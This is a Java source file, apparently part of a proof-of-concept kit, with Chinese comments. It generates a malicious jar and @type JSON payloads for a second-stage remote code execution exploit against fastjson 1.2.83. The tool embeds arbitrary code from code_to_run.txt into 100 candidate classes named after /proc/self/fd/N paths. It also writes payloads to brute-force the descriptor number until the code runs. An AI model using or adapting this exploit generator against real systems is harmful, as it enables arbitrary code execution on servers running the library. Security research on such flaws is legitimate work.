package poc_1283;

import picocli.CommandLine;
import picocli.CommandLine.Command;
import picocli.CommandLine.Option;
import utils.CodeLoader;
import utils.JavassistGen;
import utils.PocIO;

import java.util.LinkedHashMap;
import java.util.Map;
import java.util.concurrent.Callable;

/**
 * 生成 fastjson 1.2.83 RCE 【二阶段 · jar:file 本地 fd 加载】的恶意 jar。
 *
 * 背景：JDK9+ 一阶段（jar:http://）因 JVM 对连续 // 的类名校验失败，只能 SSRF。
 * 但 JVM 通过 jar:http 下载 jar 后会缓存到 /tmp/jar_cache*.tmp 并删除文件、保留 fd，
 * 于是可用 jar:file:/proc/self/fd/N!/X 读回该 fd 里的 jar 完成类加载（Linux）。
 * 由于 fd 号未知，jar 里预置 fd1~fd100 共 100 个候选类，逐个爆破。
 *
 * 要执行的代码从 code_to_run.txt 读取（含 try-catch 包裹）。
 *
 * 使用：
 *   java -cp ... poc_1283.GenFileProbe [--out O]
 * 爆破 payload（N = fd 号，1..100）：
 *   {"@type":"jar:file:.proc.self.fd.<N>!.E<N>","x":1}
 */
@Command(name = "GenFileProbe", mixinStandardHelpOptions = true,
        description = "生成 fastjson 1.2.83 二阶段 jar:file:/proc/self/fd/N 爆破 jar（fd1~fd100，代码来自 code_to_run.txt）")
public class GenFileProbe implements Callable<Integer> {

    /** 爆破范围 */
    static final int FD_MIN = 1;
    static final int FD_MAX = 100;

    @Option(names = "--out", defaultValue = "poc/artifacts/1283/probe_file",
            description = "输出 jar 路径（默认 poc/artifacts/1283/probe_file）")
    String out;

    @Override
    public Integer call() throws Exception {
        String body = CodeLoader.loadBody();

        Map<String, byte[]> entries = new LinkedHashMap<>();
        StringBuilder payloadLines = new StringBuilder();
        for (int fd = FD_MIN; fd <= FD_MAX; fd++) {
            String className   = "E" + fd;                          // jar 内 entry 名 / 合法类名
            String internalName = "jar:file:/proc/self/fd/" + fd + "!/E" + fd; // this_class

            // fastjson 1.x 需要 @JSONType 注解作为信任信号 → withJsonType=true
            entries.put(className + ".class", JavassistGen.generate(internalName, body, true));
            payloadLines.append("{\"@type\":\"jar:file:.proc.self.fd.")
                    .append(fd).append("!.E").append(fd).append("\",\"x\":1}")
                    .append(System.lineSeparator());
        }
        PocIO.writeJar(out, entries);
        // fd 爆破 payload（多行，供 exp 读取逐行发送）
        PocIO.writeText("poc/artifacts/1283/fd-payload.txt", payloadLines.toString());

        System.out.println("[+] jar written: " + out + " (" + (FD_MAX - FD_MIN + 1) + " candidate classes, fd " + FD_MIN + "~" + FD_MAX + ")");
        System.out.println("[+] payload file: poc/artifacts/1283/fd-payload.txt");
        System.out.println("[+] payload 模板: {\"@type\":\"jar:file:.proc.self.fd.<N>!.E<N>\",\"x\":1}   (N = fd 号)");
        System.out.println("[+] 爆破方式    : 遍历 N = 1..100 发送 payload，命中 fd 即 RCE");
        return 0;
    }

    public static void main(String[] args) {
        System.exit(new CommandLine(new GenFileProbe()).execute(args));
    }
}
